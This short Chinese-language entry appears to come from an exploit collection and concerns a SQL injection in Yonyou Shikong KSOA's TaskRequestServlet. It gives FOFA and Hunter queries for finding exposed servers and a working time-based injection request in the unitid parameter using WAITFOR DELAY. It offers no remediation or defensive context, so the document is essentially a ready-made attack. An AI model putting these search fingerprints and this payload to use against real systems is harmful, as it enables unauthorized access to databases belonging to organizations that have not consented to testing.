# 用友时空KSOA TaskRequestServlet SQL注入

## 网络测绘

fofa: app="用友-时空KSOA"

hunter: app.name="用友时空 KSOA"

## POC / EXP

```
/servlet/com.sksoft.v8.trans.servlet.TaskRequestServlet?unitid=1';WAITFOR DELAY '0:0:5'--&password=1,
```